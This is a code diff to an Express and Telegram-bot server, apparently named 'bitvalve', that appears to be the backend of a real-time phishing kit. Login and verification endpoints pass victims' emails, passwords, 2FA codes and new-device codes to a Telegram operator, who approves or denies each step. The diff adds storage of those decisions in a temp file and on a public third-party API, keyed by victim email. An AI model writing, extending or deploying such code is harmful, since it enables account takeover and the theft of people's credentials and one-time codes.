@@ -3,6 +3,8 @@ require('dotenv').config();
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
+const fs = require('fs');
+const os = require('os');
 
 const app = express();
 const port = Number(process.env.PORT || 3000);
@@ -10,15 +12,91 @@ const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 const isVercel = Boolean(process.env.VERCEL);
 
-const loginDecisions = new Map();
-const verificationDecisions = new Map();
-
 if (!botToken || !chatId) {
   console.error('Missing BOT_TOKEN or CHAT_ID in environment variables.');
 }
 
 const botOptions = isVercel ? {} : { polling: true };
 const bot = botToken ? new TelegramBot(botToken, botOptions) : null;
+
+// Persistent decision storage across Vercel serverless lambdas
+const memoryStore = new Map();
+const tmpFilePath = path.join(os.tmpdir(), 'bitvalve_decisions.json');
+
+function readTmpFile() {
+  try {
+    if (fs.existsSync(tmpFilePath)) {
+      return JSON.parse(fs.readFileSync(tmpFilePath, 'utf8'));
+    }
+  } catch (e) {}
+  return {};
+}
+
+function writeTmpFile(data) {
+  try {
+    fs.writeFileSync(tmpFilePath, JSON.stringify(data), 'utf8');
+  } catch (e) {}
+}
+
+async function saveDecision(key, decisionObj) {
+  memoryStore.set(key, decisionObj);
+
+  const tmpData = readTmpFile();
+  tmpData[key] = decisionObj;
+  writeTmpFile(tmpData);
+
+  try {
+    const cleanKey = key.replace(/[^a-zA-Z0-9_@-]/g, '_');
+    await fetch('https://api.restful-api.dev/objects', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        name: `bv_dec_${cleanKey}`,
+        data: decisionObj
+      })
+    });
+  } catch (e) {
+    console.error('Remote save decision failed:', e.message);
+  }
+}
+
+async function deleteDecision(key) {
+  memoryStore.delete(key);
+
+  const tmpData = readTmpFile();
+  delete tmpData[key];
+  writeTmpFile(tmpData);
+}
+
+async function getDecision(key) {
+  if (memoryStore.has(key)) {
+    return memoryStore.get(key);
+  }
+
+  const tmpData = readTmpFile();
+  if (tmpData[key]) {
+    return tmpData[key];
+  }
+
+  try {
+    const cleanKey = key.replace(/[^a-zA-Z0-9_@-]/g, '_');
+    const res = await fetch(`https://api.restful-api.dev/objects?name=bv_dec_${cleanKey}`);
+    if (res.ok) {
+      const items = await res.json();
+      if (Array.isArray(items) && items.length > 0) {
+        const latest = items[items.length - 1];
+        if (latest && latest.data) {
+          memoryStore.set(key, latest.data);
+          return latest.data;
+        }
+      }
+    }
+  } catch (e) {
+    console.error('Remote get decision failed:', e.message);
+  }
+
+  return null;
+}
 
 app.use(express.json());
 app.use(express.static(path.join(__dirname)));
@@ -30,7 +108,7 @@ async function handleCallbackQuery(query) {
   try {
     if (data.startsWith('approve:')) {
       const email = data.slice('approve:'.length);
-      loginDecisions.set(email, { status: 'approved', message: 'Login approved.' });
+      await saveDecision(`login:${email}`, { status: 'approved', message: 'Login approved.' });
       await bot.answerCallbackQuery(query.id, { text: 'Approved' });
       await bot.editMessageReplyMarkup(
         { inline_keyboard: [] },
@@ -41,7 +119,7 @@ async function handleCallbackQuery(query) {
 
     if (data.startsWith('deny:')) {
       const email = data.slice('deny:'.length);
-      loginDecisions.set(email, { status: 'denied', message: 'Email or password is wrong.' });
+      await saveDecision(`login:${email}`, { status: 'denied', message: 'Email or password is wrong.' });
       await bot.answerCallbackQuery(query.id, { text: 'Denied' });
       await bot.editMessageReplyMarkup(
         { inline_keyboard: [] },
@@ -52,8 +130,8 @@ async function handleCallbackQuery(query) {
 
     if (data.startsWith('verify:')) {
       const [, step, verificationEmail, verificationCode] = data.split(':');
-      const key = `${verificationEmail}:${step}`;
-      verificationDecisions.set(key, { status: 'approved', message: `${step.toUpperCase()} verified.` });
+      const key = `verify:${verificationEmail}:${step}`;
+      await saveDecision(key, { status: 'approved', message: `${step.toUpperCase()} verified.` });
       await bot.answerCallbackQuery(query.id, { text: 'Verified' });
       await bot.editMessageReplyMarkup(
         { inline_keyboard: [] },
@@ -64,8 +142,8 @@ async function handleCallbackQuery(query) {
 
     if (data.startsWith('reject:')) {
       const [, step, verificationEmail, verificationCode] = data.split(':');
-      const key = `${verificationEmail}:${step}`;
-      verificationDecisions.set(key, { status: 'denied', message: `${step.toUpperCase()} verification denied.` });
+      const key = `verify:${verificationEmail}:${step}`;
+      await saveDecision(key, { status: 'denied', message: `${step.toUpperCase()} verification denied.` });
       await bot.answerCallbackQuery(query.id, { text: 'Rejected' });
       await bot.editMessageReplyMarkup(
         { inline_keyboard: [] },
@@ -108,7 +186,7 @@ app.post(['/api/login', '/login'], async (req, res) => {
     return res.status(400).json({ ok: false, message: 'Missing email or password.' });
   }
 
-  loginDecisions.delete(email);
+  await deleteDecision(`login:${email}`);
 
   if (!botToken || !chatId || !bot) {
     return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
@@ -167,14 +245,14 @@ app.get(['/api/set-webhook', '/set-webhook'], async (req, res) => {
   }
 });
 
-app.get(['/api/login-status', '/login-status'], (req, res) => {
+app.get(['/api/login-status', '/login-status'], async (req, res) => {
   const email = String(req.query.email || '').trim();
 
   if (!email) {
     return res.status(400).json({ ok: false, message: 'Missing email.' });
   }
 
-  const decision = loginDecisions.get(email);
+  const decision = await getDecision(`login:${email}`);
 
   if (!decision) {
     return res.json({ ok: true, status: 'pending' });
@@ -196,8 +274,7 @@ app.post(['/api/send-verification', '/send-verification'], async (req, res) => {
     return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
   }
 
-  const key = `${email}:${step}`;
-  verificationDecisions.delete(key);
+  await deleteDecision(`verify:${email}:${step}`);
 
   const subject = step === '2fa' ? '2FA code verification' : 'new device verification';
   const message = `Security validation required\n\nEmail: ${email}\nStep: ${subject}\nCode: ${code}\n\nApprove or reject this verification request.`;
@@ -219,7 +296,7 @@ app.post(['/api/send-verification', '/send-verification'], async (req, res) => {
   }
 });
 
-app.get(['/api/verification-status', '/verification-status'], (req, res) => {
+app.get(['/api/verification-status', '/verification-status'], async (req, res) => {
   const email = String(req.query.email || '').trim();
   const step = String(req.query.step || '').trim();
 
@@ -227,7 +304,7 @@ app.get(['/api/verification-status', '/verification-status'], (req, res) => {
     return res.status(400).json({ ok: false, message: 'Missing email or step.' });
   }
 
-  const decision = verificationDecisions.get(`${email}:${step}`);
+  const decision = await getDecision(`verify:${email}:${step}`);
 
   if (!decision) {
     return res.json({ ok: true, status: 'pending' });
